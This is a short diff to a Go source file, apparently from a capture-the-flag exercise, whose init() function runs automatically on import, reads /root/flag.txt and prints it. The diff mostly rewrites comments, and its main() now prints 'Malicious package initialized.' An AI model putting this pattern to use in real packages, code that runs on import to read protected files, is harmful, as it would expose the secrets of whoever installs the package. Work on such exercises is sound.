@@ -6,7 +6,7 @@ import (
 )
 
 func init() {
-	// This is where the malicious behavior happens. It tries to read the flag.
+	// This will be automatically called when the package is imported
 	cmd := exec.Command("cat", "/root/flag.txt")
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -14,10 +14,12 @@ func init() {
 		return
 	}
 
-	// The flag will be printed when the package is fetched by `go get`
+	// Print the flag
 	fmt.Printf("Flag: %s\n", output)
 }
 
 func main() {
-	// The main function does nothing, the execution happens in init()
+	// The main function is just here to make sure the package runs without errors
+	// The real action happens in init()
+	fmt.Println("Malicious package initialized.")
 }
